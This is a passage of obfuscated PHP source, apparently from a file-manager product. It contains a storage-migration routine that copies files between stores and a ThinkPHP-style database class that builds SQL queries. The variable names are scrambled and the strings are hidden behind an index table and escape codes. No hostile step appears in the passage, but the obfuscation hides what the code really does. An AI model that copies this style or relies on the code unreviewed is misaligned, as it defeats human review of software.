$€•š×[$õ¹¦ŒöÉ[566]])); $–’³ä‹ß = $ÎæÎéÌ¦->field(array($õ¹¦ŒöÉ[951] => $õ¹¦ŒöÉ[952], $õ¹¦ŒöÉ[953] => $õ¹¦ŒöÉ[89]))->where($û¥‘èØ±)->find(); if (!$–’³ä‹ß[$õ¹¦ŒöÉ[952]]) { return; } $Ö†éœ´ = intval($–’³ä‹ß[$õ¹¦ŒöÉ[952]]); $áóÆÕÀñ = intval($–’³ä‹ß[$õ¹¦ŒöÉ[89]]); $€•š×[$õ¹¦ŒöÉ[858]][$õ¹¦ŒöÉ[861]] += $Ö†éœ´; $€•š×[$õ¹¦ŒöÉ[858]][$õ¹¦ŒöÉ[866]] += $áóÆÕÀñ; $€•š×[$õ¹¦ŒöÉ[214]] = time(); Model($õ¹¦ŒöÉ[875])->set($õ¹¦ŒöÉ[945], $€•š×, $õ¹¦ŒöÉ[881]); $¨Øë…ïÒ = new TaskFileTransfer($ÇÇšÆÉè, $õ¹¦ŒöÉ[881], $Ö†éœ´, LNG($õ¹¦ŒöÉ[889]) . $õ¹¦ŒöÉ[890] . LNG($õ¹¦ŒöÉ[920])); $¨Øë…ïÒ->task[$õ¹¦ŒöÉ[866]] = $áóÆÕÀñ; $²Ì´Ïñå = 500; $›‚…°½ = 1; $ò¦Ñùàî = $õ¹¦ŒöÉ[924]; $â»³†à² = $ÎæÎéÌ¦->where($û¥‘èØ±)->field($ò¦Ñùàî)->order($õ¹¦ŒöÉ[925])->selectPage($²Ì´Ïñå, $›‚…°½); $Äù¡Ş‚´ = array($õ¹¦ŒöÉ[861] => 0, $õ¹¦ŒöÉ[954] => 0, $õ¹¦ŒöÉ[944] => 0, $õ¹¦ŒöÉ[955] => $€•š×[$õ¹¦ŒöÉ[566]], $õ¹¦ŒöÉ[956] => 0); $öˆß²½ = intval($â»³†à²[$õ¹¦ŒöÉ[452]][$õ¹¦ŒöÉ[454]]); while ($â»³†à² && $›‚…°½ <= $öˆß²½) { if (timeFloat() - $‚ºç£ıı > $Ï‡Œ¿‹ı) { break; } foreach ($â»³†à²[$õ¹¦ŒöÉ[455]] as $‹¿©â) { if (timeFloat() - $‚ºç£ıı > $Ï‡Œ¿‹ı) { break; } $Äù¡Ş‚´[$õ¹¦ŒöÉ[861]]++; $Äù¡Ş‚´[$õ¹¦ŒöÉ[956]] = $‹¿©â[$õ¹¦ŒöÉ[566]]; $€•š×[$õ¹¦ŒöÉ[566]] = $‹¿©â[$õ¹¦ŒöÉ[566]]; $€•š×[$õ¹¦ŒöÉ[858]][$õ¹¦ŒöÉ[942]]++; $€•š×[$õ¹¦ŒöÉ[858]][$õ¹¦ŒöÉ[943]] += $‹¿©â[$õ¹¦ŒöÉ[89]]; $¬İƒÊªì = $‹¿©â[$õ¹¦ŒöÉ[97]]; if (!$this->isFileExist($‹¿©â, $ÎæÎéÌ¦)) { $¨Øë…ïÒ->updateFileEnd($‹¿©â[$õ¹¦ŒöÉ[42]], $‹¿©â[$õ¹¦ŒöÉ[89]]); $€•š×[$õ¹¦ŒöÉ[858]][$õ¹¦ŒöÉ[944]]++; $Äù¡Ş‚´[$õ¹¦ŒöÉ[954]]++; write_log($õ¹¦ŒöÉ[926] . $‹¿©â[$õ¹¦ŒöÉ[566]] . $õ¹¦ŒöÉ[927] . $¬İƒÊªì, $õ¹¦ŒöÉ[938]); continue; } $š‹¸Ö“¦ = $ôÄ‰”İö . substr($¬İƒÊªì, strlen("\173\x69\157\x3a{$‹¿©â[$õ¹¦ŒöÉ[928]]}\x7d\57")); if (IO::exist($š‹¸Ö“¦)) { $¨Øë…ïÒ->updateFileEnd($‹¿©â[$õ¹¦ŒöÉ[42]], $‹¿©â[$õ¹¦ŒöÉ[89]]); continue; } $š‹¸Ö“¦ = get_path_father($š‹¸Ö“¦); if (!IO::copy($¬İƒÊªì, $š‹¸Ö“¦, REPEAT_SKIP)) { $€•š×[$õ¹¦ŒöÉ[858]][$õ¹¦ŒöÉ[944]]++; $Äù¡Ş‚´[$õ¹¦ŒöÉ[944]]++; write_log($õ¹¦ŒöÉ[957] . $‹¿©â[$õ¹¦ŒöÉ[566]] . $õ¹¦ŒöÉ[927] . $¬İƒÊªì, $õ¹¦ŒöÉ[938]); } $¨Øë…ïÒ->updateFileEnd($‹¿©â[$õ¹¦ŒöÉ[42]], $‹¿©â[$õ¹¦ŒöÉ[89]]); } Model($õ¹¦ŒöÉ[875])->set($õ¹¦ŒöÉ[945], $€•š×, $õ¹¦ŒöÉ[881]); $›‚…°½++; $â»³†à² = $ÎæÎéÌ¦->where($û¥‘èØ±)->field($ò¦Ñùàî)->order($õ¹¦ŒöÉ[925])->selectPage($²Ì´Ïñå, $›‚…°½); } $¨Øë…ïÒ->end(); write_log($õ¹¦ŒöÉ[958] . json_encode($Äù¡Ş‚´), $õ¹¦ŒöÉ[938]); if (IO::mkdir($ôÄ‰”İö . $õ¹¦ŒöÉ[959])) { $Äù¡Ş‚´[$õ¹¦ŒöÉ[956]] = $€•š×[$õ¹¦ŒöÉ[566]]; IO::setContent($ôÄ‰”İö . $õ¹¦ŒöÉ[960] . date($õ¹¦ŒöÉ[961]) . $õ¹¦ŒöÉ[962], json_encode($Äù¡Ş‚´)); } Model($õ¹¦ŒöÉ[875])->set($õ¹¦ŒöÉ[945], $€•š×, $õ¹¦ŒöÉ[881]); return !0; } private function isFileExist($ëª’¬¿, $Úúèçİí) { $ìÙÂ‹Ã´ =& $_SERVER[øşô´çË]; static $‹³€âÃ = null; static $†ñó€‚ = null; if (is_null($‹³€âÃ)) { $‹³€âÃ = $†ñó€‚ = array(); } $ù’¸¾”˜ = $ëª’¬¿[$ìÙÂ‹Ã´[928]]; $¦€Çëï¢ = KodIO::parse($ëª’¬¿[$ìÙÂ‹Ã´[97]]); if ($ù’¸¾”˜ != $¦€Çëï¢[$ìÙÂ‹Ã´[496]]) { return !1; } if (!isset($‹³€âÃ[$ù’¸¾”˜])) { $‹³€âÃ[$ù’¸¾”˜] = $this->checkStore($ù’¸¾”˜); } if ($‹³€âÃ[$ù’¸¾”˜] !== 1) { return !1; } if (in_array($ëª’¬¿[$ìÙÂ‹Ã´[566]], $†ñó€‚)) { return !1; } $î¸‚îßè = $ëª’¬¿[$ìÙÂ‹Ã´[97]]; if (IO::exist($î¸‚îßè)) { return !0; } $Ÿ¢ÆÔÜ = get_path_father($î¸‚îßè); if (IO::exist($Ÿ¢ÆÔÜ)) { $†ñó€‚[] = $ëª’¬¿[$ìÙÂ‹Ã´[566]]; return !1; } $âğ½àé = array($ìÙÂ‹Ã´[928] => $ù’¸¾”˜, $ìÙÂ‹Ã´[97] => array($ìÙÂ‹Ã´[482], "{$Ÿ¢ÆÔÜ}\x25")); $ãÌ¿©— = $Úúèçİí->where($âğ½àé)->field($ìÙÂ‹Ã´[567])->select(); $†ñó€‚ = array_merge($†ñó€‚, array_to_keyvalue($ãÌ¿©—, $ìÙÂ‹Ã´[12], $ìÙÂ‹Ã´[566])); return !1; } public function checkStore($‰êä¶à) { static $Ìß‚Ù©Ñ; if (is_null($Ìß‚Ù©Ñ)) { $Ìß‚Ù©Ñ = Model($_SERVER[øşô´çË][870]); } $‘òêØáÀ = $Ìß‚Ù©Ñ->listData($‰êä¶à); if (!$‘òêØáÀ) { return 0; } try { $“Æ¢¼€¡ = $Ìß‚Ù©Ñ->checkConfig($‘òêØáÀ, !0); } catch (Exception $½ïéÙˆÃ) { $“Æ¢¼€¡ = !1; } return $“Æ¢¼€¡ === !0 ? 1 : 0; } } goto f…íáóæ£; BğÇêåï—·: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\x74\150\151\156\153\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\x71" => "\x3d", "\x6e\x65\161" => "\x3c\76", "\x67\164" => "\x3e", "\145\x67\x74" => "\x3e\75", "\x6c\164" => "\x3c", "\145\154\164" => "\74\x3d", "\x6e\x6f\164\x6c\151\153\145" => "\116\117\124\x20\114\111\x4b\105", "\154\151\153\145" => "\114\111\x4b\x45", "\151\156" => "\111\116", "\x6e\157\x74\151\156" => "\x4e\x4f\x54\40\x49\x4e", "\156\157\164\40\x69\x6e" => "\x4e\x4f\124\40\111\116", "\142\145\x74\x77\145\145\156" => "\102\105\x54\127\x45\x45\116", "\x6e\x6f\x74\x62\x65\164\x77\145\145\156" => "\116\117\124\x20\x42\x45\124\127\x45\105\x4e", "\156\x6f\164\40\x62\x65\164\x77\x65\x65\x6e" => "\x4e\x4f\124\40\102\x45\124\x57\105\105\x4e"); protected $selectSql = "\x53\x45\x4c\105\103\x54\x25\x44\x49\x53\x54\111\x4e\103\x54\x25\x20\45\x46\x49\105\x4c\x44\45\40\x46\122\x4f\x4d\x20\45\x54\x41\102\114\105\x25\45\112\117\x49\116\x25\45\127\110\105\122\105\x25\45\107\x52\117\x55\x50\45\x25\110\101\126\111\116\x47\45\45\x4f\122\x44\105\x52\x25\x25\114\111\115\111\124\45\x20\x25\x55\116\x49\117\116\x25\45\103\x4f\x4d\115\x45\x4e\124\45"; protected $bind = array(); public static function getInstance() { $ˆÆ¼¹Åå = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[øşô´çË][1124], $ˆÆ¼¹Åå); } public function factory($ÆÁµÖÈç = '') { $¸û¬ÏœË =& $_SERVER[øşô´çË]; $ÆÁµÖÈç = $this->parseConfig($ÆÁµÖÈç); if (empty($ÆÁµÖÈç[$¸û¬ÏœË[1125]])) { think_exception(think_lang($¸û¬ÏœË[1126])); } $this->dbType = ucwords(strtolower($ÆÁµÖÈç[$¸û¬ÏœË[1125]])); $¤¡Ñèß¨ = $¸û¬ÏœË[1127] . $this->dbType; if (class_exists($¤¡Ñèß¨)) { $Óî÷’ƒ = new $¤¡Ñèß¨($ÆÁµÖÈç); if ($¸û¬ÏœË[1128] != strtolower($ÆÁµÖÈç[$¸û¬ÏœË[1125]])) { $Óî÷’ƒ->dbType = strtoupper($this->dbType); } else { $Óî÷’ƒ->dbType = $this->_getDsnType($ÆÁµÖÈç[$¸û¬ÏœË[1077]]); } } else { think_exception(think_lang($¸û¬ÏœË[1129]) . $¸û¬ÏœË[1130] . $¤¡Ñèß¨); } return $Óî÷’ƒ; } public function __call($Ë×­´‹õ, $Ê¥ß‘ÀÇ) { if (method_exists($this, $Ë×­´‹õ)) { return call_user_func_array(array($this, $Ë×­´‹õ), $Ê¥ß‘ÀÇ); } } protected function _getDsnType($¡ë½™) { $ŸÓ²Ë¾ô = explode($_SERVER[øşô´çË][4], $¡ë½™); $ÆÍ°ä‡÷ = strtoupper(trim($ŸÓ²Ë¾ô[0])); return $ÆÍ°ä‡÷; } private function parseConfig($Èà—æÏñ = '') { $£­ìŞÄú =& $_SERVER[øşô´çË]; if (!empty($Èà—æÏñ) && is_string($Èà—æÏñ)) { $Èà—æÏñ = $this->parseDSN($Èà—æÏñ); } elseif (is_array($Èà—æÏñ)) { $Èà—æÏñ = array_change_key_case($Èà—æÏñ); $Èà—æÏñ = array($£­ìŞÄú[1125] => $Èà—æÏñ[$£­ìŞÄú[1131]], $£­ìŞÄú[1046] => $Èà—æÏñ[$£­ìŞÄú[1132]], $£­ìŞÄú[1047] => $Èà—æÏñ[$£­ìŞÄú[1133]], $£­ìŞÄú[1044] => $Èà—æÏñ[$£­ìŞÄú[1134]], $£­ìŞÄú[1045] => $Èà—æÏñ[$£­ìŞÄú[1135]], $£­ìŞÄú[31] => $Èà—æÏñ[$£­ìŞÄú[1136]], $£­ìŞÄú[1077] => $Èà—æÏñ[$£­ìŞÄú[1137]], $£­ìŞÄú[27] => isset($Èà—æÏñ[$£­ìŞÄú[1138]]) ? $Èà—æÏñ[$£­ìŞÄú[1138]] : array()); } elseif (empty($Èà—æÏñ)) { if (think_config($£­ìŞÄú[1139]) && $£­ìŞÄú[1128] != strtolower(think_config($£­ìŞÄú[1140]))) { $Èà—æÏñ = $this->parseDSN(think_config($£­ìŞÄú[1139])); } else { $Èà—æÏñ = array($£­ìŞÄú[1125] => think_config($£­ìŞÄú[1140]), $£­ìŞÄú[1046] => think_config($£­ìŞÄú[1141]), $£­ìŞÄú[1047] => think_config($£­ìŞÄú[1142]), $£­ìŞÄú[1044] => think_config($£­ìŞÄú[1143]), $£­ìŞÄú[1045] => think_config($£­ìŞÄú[1144]), $£­ìŞÄú[31] => think_config($£­ìŞÄú[332]), $£­ìŞÄú[1077] => think_config($£­ìŞÄú[1139]), $£­ìŞÄú[27] => think_config($£­ìŞÄú[1145])); } } return $Èà—æÏñ; } protected function initConnect($¨£Ğ‘Ç” = true) { if (1 == think_config($_SERVER[øşô´çË][32])) { $this->_linkID = $this->multiConnect($¨£Ğ‘Ç”); } else { if (isset($this->config) && $this->config) { $this->configLast = $this->config; } } if (!isset($this->connected) || !$this->connected) { $this->_linkID = $this->connect(); } $this->initConnectAfter(); } protected function initConnectAfter() { } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $¿É«šŒç => $â­—œ•) { $this->_linkID = $â­—œ•; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($Ü«àôÈ‰ = false) { $¦€Ö‡É =& $_SERVER[øşô´çË]; static $³ı˜ = array(); static $Öë–”¦© = -1; if (empty($³ı˜)) { foreach ($this->config as $ßÃĞºÜŸ => $ğå¤€¨) { $³ı˜[$ßÃĞºÜŸ] = explode($¦€Ö‡É[60], $ğå¤€¨); } } if (think_config($¦€Ö‡É[1146])) { if ($Ü«àôÈ‰ || think_config($¦€Ö‡É[495]) === !0) { $Æˆ®ĞöÅ = floor(mt_rand(0, think_config($¦€Ö‡É[1147]) - 1)); $Öë–”¦© = $Æˆ®ĞöÅ; } else { if (is_numeric(think_config($¦€Ö‡É[1148]))) { $Æˆ®ĞöÅ = think_config($¦€Ö‡É[1148]); } else { $Æˆ®ĞöÅ = floor(mt_rand(think_config($¦€Ö‡É[1147]), count($³ı˜[$¦€Ö‡É[1044]]) - 1)); } } } else { $Æˆ®ĞöÅ = floor(mt_rand(0, count($³ı˜[$¦€Ö‡É[1044]]) - 1)); $Öë–”¦© = $Æˆ®ĞöÅ; } $Æˆ®ĞöÅ = $Öë–”¦© !== -1 ? $Öë–”¦© : $Æˆ®ĞöÅ; $…×şé¤Ü = array($¦€Ö‡É[1046] => isset($³ı˜[$¦€Ö‡É[1046]][$Æˆ®ĞöÅ]) ? $³ı˜[$¦€Ö‡É[1046]][$Æˆ®ĞöÅ] : $³ı˜[$¦€Ö‡É[1046]][0], $¦€Ö‡É[1047] => isset($³ı˜[$¦€Ö‡É[1047]][$Æˆ®ĞöÅ]) ? $³ı˜[$¦€Ö‡É[1047]][$Æˆ®ĞöÅ] : $³ı˜[$¦€Ö‡É[1047]][0], $¦€Ö‡É[1044] => isset($³ı˜[$¦€Ö‡É[1044]][$Æˆ®ĞöÅ]) ? $³ı˜[$¦€Ö‡É[1044]][$Æˆ®ĞöÅ] : $³ı˜[$¦€Ö‡É[1044]][0], $¦€Ö‡É[1045] => isset($³ı˜[$¦€Ö‡É[1045]][$Æˆ®ĞöÅ]) ? $³ı˜[$¦€Ö‡É[1045]][$Æˆ®ĞöÅ] : $³ı˜[$¦€Ö‡É[1045]][0], $¦€Ö‡É[31] => isset($³ı˜[$¦€Ö‡É[31]][$Æˆ®ĞöÅ]) ? $³ı˜[$¦€Ö‡É[31]][$Æˆ®ĞöÅ] : $³ı˜[$¦€Ö‡É[31]][0], $¦€Ö‡É[1077] => isset($³ı˜[$¦€Ö‡É[1077]][$Æˆ®ĞöÅ]) ? $³ı˜[$¦€Ö‡É[1077]][$Æˆ®ĞöÅ] : $³ı˜[$¦€Ö‡É[1077]][0], $¦€Ö‡É[27] => isset($³ı˜[$¦€Ö‡É[27]][$Æˆ®ĞöÅ]) ? $³ı˜[$¦€Ö‡É[27]][$Æˆ®ĞöÅ] : $³ı˜[$¦€Ö‡É[27]][0]); return $this->connect($…×şé¤Ü, $Æˆ®ĞöÅ); } public function parseDSN($ß¶Å¿¸) { $ş¼Í¹ÍŸ =& $_SERVER[øşô´çË]; if (empty($ß¶Å¿¸)) { return !1; } $çÑ±û¿‰ = parse_url($ß¶Å¿¸); if ($çÑ±û¿‰[$ş¼Í¹ÍŸ[215]]) { $‹‰¤ª÷ = array($ş¼Í¹ÍŸ[1125] => $çÑ±û¿‰[$ş¼Í¹ÍŸ[215]], $ş¼Í¹ÍŸ[1046] => isset($çÑ±û¿‰[$ş¼Í¹ÍŸ[693]]) ? $çÑ±û¿‰[$ş¼Í¹ÍŸ[693]] : $ş¼Í¹ÍŸ[12], $ş¼Í¹ÍŸ[1047] => isset($çÑ±û¿‰[$ş¼Í¹ÍŸ[1149]]) ? $çÑ±û¿‰[$ş¼Í¹ÍŸ[1149]] : $ş¼Í¹ÍŸ[12], $ş¼Í¹ÍŸ[1044] => isset($çÑ±û¿‰[$ş¼Í¹ÍŸ[216]]) ? $çÑ±û¿‰[$ş¼Í¹ÍŸ[216]] : $ş¼Í¹ÍŸ[12], $ş¼Í¹ÍŸ[1045] => isset($çÑ±û¿‰[$ş¼Í¹ÍŸ[217]]) ? $çÑ±û¿‰[$ş¼Í¹ÍŸ[217]] : $ş¼Í¹ÍŸ[12], $ş¼Í¹ÍŸ[31] => isset($çÑ±û¿‰[$ş¼Í¹ÍŸ[97]]) ? substr($çÑ±û¿‰[$ş¼Í¹ÍŸ[97]], 1) : $ş¼Í¹ÍŸ[12]); } else { preg_match($ş¼Í¹ÍŸ[1150], trim($ß¶Å¿¸), $Ø®ì³Â); $‹‰¤ª÷ = array($ş¼Í¹ÍŸ[1125] => $Ø®ì³Â[1], $ş¼Í¹ÍŸ[1046] => $Ø®ì³Â[2], $ş¼Í¹ÍŸ[1047] => $Ø®ì³Â[3], $ş¼Í¹ÍŸ[1044] => $Ø®ì³Â[4], $ş¼Í¹ÍŸ[1045] => $Ø®ì³Â[5], $ş¼Í¹ÍŸ[31] => $Ø®ì³Â[6]); } $‹‰¤ª÷[$ş¼Í¹ÍŸ[1077]] = $ş¼Í¹ÍŸ[12]; return $‹‰¤ª÷; } protected function debug() { $Àæ¡óÕª =& $_SERVER[øşô´çË]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $Àæ¡óÕª[1151]; if (think_config($Àæ¡óÕª[1152])) { think_status($Àæ¡óÕª[1153]); think_trace($this->queryStr . $Àæ¡óÕª[1154] . think_status($Àæ¡óÕª[34], $Àæ¡óÕª[1153], 6) . $Àæ¡óÕª[1155], $Àæ¡óÕª[12], $Àæ¡óÕª[1156]); } } protected function parseLock($ø¼ğŸ­õ = false) { $¨—µä” =& $_SERVER[øşô´çË]; if (!$ø¼ğŸ­õ) { return $¨—µä”[12]; } if ($¨—µä”[1079] == $this->dbType) { return $¨—µä”[1157]; } return $¨—µä”[1158]; } protected function parseSet($ÉšçĞğ•) { $şÈ›°®› =& $_SERVER[øşô´çË]; foreach ($ÉšçĞğ• as $À£ïÏä => $«’…­§‚) { if (is_array($«’…­§‚) && $şÈ›°®›[381] == $«’…­§‚[0]) { $ŞÂœ‹ö±[] = $this->parseKey($À£ïÏä) . $şÈ›°®›[473] . $«’…­§‚[1]; } elseif (is_scalar($«’…­§‚) || is_null($«’…­§‚)) { $ŞÂœ‹ö±[] = $this->parseKey($À£ïÏä) . $şÈ›°®›[473] . $this->parseValue($«’…­§‚); } } return $şÈ›°®›[1159] . implode($şÈ›°®›[60], $ŞÂœ‹ö±); } protected function bindParam($¯ß£ğâ¯, $´Ó×àğ‹) { $this->bind[$_SERVER[øşô´çË][4] . $¯ß£ğâ¯] = $´Ó×àğ‹; } protected function parseBind($Ø˜–­Ÿ±) { $Ø˜–­Ÿ± = array_merge($this->bind, $Ø˜–­Ÿ±); $this->bind = array(); return $Ø˜–­Ÿ±; } function parseKey(&$Œºøç¾ß, $´À®ÀÀ— = true) { if ($´À®ÀÀ—) { $Œºøç¾ß = $this->parseKeyCheck($Œºøç¾ß); } return $Œºøç¾ß; } function parseKeyCheck($æï¢Ÿº) { $Ñºø¥Áê =& $_SERVER[øşô´çË]; $æï¢Ÿº = trim($æï¢Ÿº); if (!preg_match($Ñºø¥Áê[1160], $æï¢Ÿº)) { think_exception($Ñºø¥Áê[1161] . $æï¢Ÿº); } return $æï¢Ÿº; } protected function parseValue($ìµÜƒ Ú) { $ùÅ»Åá› =& $_SERVER[øşô´çË]; if (is_string($ìµÜƒ Ú)) { $ìµÜƒ Ú = $ùÅ»Åá›[1118] . $this->escapeString($ìµÜƒ Ú) . $ùÅ»Åá›[1118]; } elseif (isset($ìµÜƒ Ú[0]) && is_string($ìµÜƒ Ú[0]) && strtolower($ìµÜƒ Ú[0]) == $ùÅ»Åá›[381]) { $ìµÜƒ Ú = $this->escapeString($ìµÜƒ Ú[1]); } elseif (is_array($ìµÜƒ Ú)) { $ìµÜƒ Ú = array_map(array($this, $ùÅ»Åá›[1119]), $ìµÜƒ Ú); } elseif (is_bool($ìµÜƒ Ú)) { $ìµÜƒ Ú = $ìµÜƒ Ú ? $ùÅ»Åá›[101] : $ùÅ»Åá›[238]; } elseif (is_null($ìµÜƒ Ú)) { $ìµÜƒ Ú = $ùÅ»Åá›[113]; } return $ìµÜƒ Ú; } protected function parseField($óõëñ) { $‘Ö‘Ğ¡ =& $_SERVER[øşô´çË]; if (is_string($óõëñ) && strpos($óõëñ, $‘Ö‘Ğ¡[60])) { $óõëñ = explode($‘Ö‘Ğ¡[60], $óõëñ); } if (is_array($óõëñ)) { $ş·¿Øâü = array(); foreach ($óõëñ as $öÀš¨åâ => $˜Ò«®ù±) { if (!is_numeric($öÀš¨åâ)) { $ş·¿Øâü[] = $this->parseKey($öÀš¨åâ, !1) . $‘Ö‘Ğ¡[1162] . $this->parseKey($˜Ò«®ù±); } else { $ş·¿Øâü[] = $this->parseKey($˜Ò«®ù±); } } $õ»Ï¸‹ = implode($‘Ö‘Ğ¡[60], $ş·¿Øâü); } elseif (is_string($óõëñ) && !empty($óõëñ)) { $õ»Ï¸‹ = $óõëñ; } else { $õ»Ï¸‹ = $‘Ö‘Ğ¡[230]; } return $õ»Ï¸‹; } protected function parseTable($Š•ŒÆ) { $–ß”ì‰ã =& $_SERVER[øşô´çË]; if (is_array($Š•ŒÆ)) { $è™³‡ûÖ = array(); foreach ($Š•ŒÆ as $‡¹ØÜŒ¾ => $ç¨µÃÕ’) { if (!is_numeric($‡¹ØÜŒ¾)) { $è™³‡ûÖ[] = $this->parseKey($‡¹ØÜŒ¾) . $–ß”ì‰ã[63] . $this->parseKey($ç¨µÃÕ’); } else { $è™³‡ûÖ[] = $this->parseKey($‡¹ØÜŒ¾); } } $Š•ŒÆ = $è™³‡ûÖ; } elseif (is_string($Š•ŒÆ)) { if (strstr($Š•ŒÆ, $–ß”ì‰ã[63])) { return $Š•ŒÆ; } $Š•ŒÆ = explode($–ß”ì‰ã[60], $Š•ŒÆ); array_walk($Š•ŒÆ, array($this, $–ß”ì‰ã[1064])); } return $–ß”ì‰ã[1058] . trim(implode($–ß”ì‰ã[1163], $Š•ŒÆ), $–ß”ì‰ã[484]) . $–ß”ì‰ã[1058]; } protected function parseWhere($¼¸ƒ¯Ş) { $çÜ¾µ ê =& $_SERVER[øşô´çË]; $–«ˆ®˜ = $çÜ¾µ ê[12]; if (is_string($¼¸ƒ¯Ş)) { $–«ˆ®˜ = $¼¸ƒ¯Ş; } else { $şšæÉş‡ = isset($¼¸ƒ¯Ş[$çÜ¾µ ê[1164]]) ? strtoupper($¼¸ƒ¯Ş[$çÜ¾µ ê[1164]]) : $çÜ¾µ ê[12]; if (in_array($şšæÉş‡, array($çÜ¾µ ê[1165], $çÜ¾µ ê[1166], $çÜ¾µ ê[1167]))) { $şšæÉş‡ = $çÜ¾µ ê[63] . $şšæÉş‡ . $çÜ¾µ ê[63]; unset($¼¸ƒ¯Ş[$çÜ¾µ ê[1164]]); } else { $şšæÉş‡ = $çÜ¾µ ê[1168]; } foreach ($¼¸ƒ¯Ş as $šóÑ‚›Ô => $—¶êåöÜ) { $–«ˆ®˜ .= $çÜ¾µ ê[364]; if (is_numeric($šóÑ‚›Ô)) { $šóÑ‚›Ô = $çÜ¾µ ê[1169]; } if (0 === strpos($šóÑ‚›Ô, $çÜ¾µ ê[11])) { $–«ˆ®˜ .= $this->parseThinkWhere($šóÑ‚›Ô, $—¶êåöÜ); } else { if (!preg_match($çÜ¾µ ê[1170], trim($šóÑ‚›Ô))) { think_exception(think_lang($çÜ¾µ ê[1171]) . $çÜ¾µ ê[4] . $šóÑ‚›Ô); } $Ú†²àöã = is_array($—¶êåöÜ) && isset($—¶êåöÜ[$çÜ¾µ ê[1172]]); $šóÑ‚›Ô = trim($šóÑ‚›Ô); if (strpos($šóÑ‚›Ô, $çÜ¾µ ê[222])) { $‘–ïÃÅ¯ = explode($çÜ¾µ ê[222], $šóÑ‚›Ô); $º©×©ÑÛ = array(); foreach ($‘–ïÃÅ¯ as $¹ğ—îĞÜ => $¿Æé™±„) { $”ş¿Ä“ƒ = $Ú†²àöã ? $—¶êåöÜ[$¹ğ—îĞÜ] : $—¶êåöÜ; $º©×©ÑÛ[] = $çÜ¾µ ê[346] . $this->parseWhereItem($this->parseKey($¿Æé™±„), $”ş¿Ä“ƒ) . $çÜ¾µ ê[1063]; } $–«ˆ®˜ .= implode($çÜ¾µ ê[1173], $º©×©ÑÛ); } elseif (strpos($šóÑ‚›Ô, $çÜ¾µ ê[294])) { $‘–ïÃÅ¯ = explode($çÜ¾µ ê[294], $šóÑ‚›Ô); $º©×©ÑÛ = array(); foreach ($‘–ïÃÅ¯ as $¹ğ—îĞÜ => $¿Æé™±„) { $”ş¿Ä“ƒ = $Ú†²àöã ? $—¶êåöÜ[$¹ğ—îĞÜ] : $—¶êåöÜ; $º©×©ÑÛ[] = $çÜ¾µ ê[346] . $this->parseWhereItem($this->parseKey($¿Æé™±„), $”ş¿Ä“ƒ) . $çÜ¾µ ê[1063]; } $–«ˆ®˜ .= implode($çÜ¾µ ê[1168], $º©×©ÑÛ); } else { $–«ˆ®˜ .= $this->parseWhereItem($this->parseKey($šóÑ‚›Ô), $—¶êåöÜ); } } $–«ˆ®˜ .= $çÜ¾µ ê[365] . $şšæÉş‡; } $–«ˆ®˜ = substr($–«ˆ®˜, 0, -strlen($şšæÉş‡)); } return empty($–«ˆ®˜) ? $çÜ¾µ ê[12] : $çÜ¾µ ê[1174] . $–«ˆ®˜; } protected function parseWhereItem($ ºšØĞë, $Õ‘„¡Êİ) { $ú³¼…¼´ =& $_SERVER[øşô´çË]; $¬ˆŠ¾øê = $ú³¼…¼´[12]; if (is_array($Õ‘„¡Êİ)) { if (is_string($Õ‘„¡Êİ[0])) { $¹Û÷š²® = strtolower($Õ‘„¡Êİ[0]); if (in_array($Õ‘„¡Êİ[0], array($ú³¼…¼´[473], $ú³¼…¼´[1175], $ú³¼…¼´[1176], $ú³¼…¼´[1177], $ú³¼…¼´[1178], $ú³¼…¼´[1179]))) { $¬ˆŠ¾øê .= $ ºšØĞë . $ú³¼…¼´[63] . $Õ‘„¡Êİ[0] . $ú³¼…¼´[63] . $this->parseValue($Õ‘„¡Êİ[1]); } elseif (preg_match($ú³¼…¼´[1180], $Õ‘„¡Êİ[0])) { $¬ˆŠ¾øê .= $ ºšØĞë . $ú³¼…¼´[63] . $this->exp[$¹Û÷š²®] . $ú³¼…¼´[63] . $this->parseValue($Õ‘„¡Êİ[1]); } elseif (preg_match($ú³¼…¼´[1181], $Õ‘„¡Êİ[0])) { if (is_array($Õ‘„¡Êİ[1])) { $ê¢ö’À› = isset($Õ‘„¡Êİ[2]) ? strtoupper($Õ‘„¡Êİ[2]) : $ú³¼…¼´[1166]; if (in_array($ê¢ö’À›, array($ú³¼…¼´[1165], $ú³¼…¼´[1166], $ú³¼…¼´[1167]))) { $¾Â×À¦õ = array(); foreach ($Õ‘„¡Êİ[1] as $…®âì¢æ) { $¾Â×À¦õ[] = $ ºšØĞë . $ú³¼…¼´[63] . $this->exp[$¹Û÷š²®] . $ú³¼…¼´[63] . $this->parseValue($…®âì¢æ); } $¬ˆŠ¾øê .= $ú³¼…¼´[346] . implode($ú³¼…¼´[63] . $ê¢ö’À› . $ú³¼…¼´[63], $¾Â×À¦õ) . $ú³¼…¼´[1063]; } } else { $¬ˆŠ¾øê .= $ ºšØĞë . $ú³¼…¼´[63] . $this->exp[$¹Û÷š²®] . $ú³¼…¼´[63] . $this->parseValue($Õ‘„¡Êİ[1]); } } elseif ($ú³¼…¼´[381] == $¹Û÷š²®) { $¬ˆŠ¾øê .= $ú³¼…¼´[1061] . $ ºšØĞë . $ú³¼…¼´[63] . $Õ‘„¡Êİ[1] . $ú³¼…¼´[1182]; } elseif (preg_match($ú³¼…¼´[1183], $Õ‘„¡Êİ[0])) { $¬ˆŠ¾øê .= $Õ‘„¡Êİ[0]; } elseif (preg_match($ú³¼…¼´[1184], $Õ‘„¡Êİ[0])) { if (isset($Õ‘„¡Êİ[2]) && $ú³¼…¼´[381] == $Õ‘„¡Êİ[2]) { $¬ˆŠ¾øê .= $ ºšØĞë . $ú³¼…¼´[63] . $this->exp[$¹Û÷š²®] . $ú³¼…¼´[63] . $Õ‘„¡Êİ[1]; } else { if (is_string($Õ‘„¡Êİ[1])) { $Õ‘„¡Êİ[1] = explode($ú³¼…¼´[60], $Õ‘„¡Êİ[1]); } $¶¥¶€ùÃ = 